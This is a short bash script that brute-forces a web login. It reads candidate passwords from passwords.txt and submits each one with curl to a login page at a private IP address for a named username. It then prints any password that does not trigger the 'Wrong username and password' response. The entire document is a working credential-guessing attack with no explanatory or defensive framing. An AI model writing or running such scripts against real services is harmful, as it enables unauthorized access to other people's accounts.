#! /bin/bash

input="passwords.txt"

while read -r line
do
guess=$(curl -s "192.168.3.151/index.php?username=furkan.paligu&password=${line}") 
result=$(echo $guess | grep "Wrong username and password")
if [[ -z ${result} ]]
then
echo $line
fi
done<$input
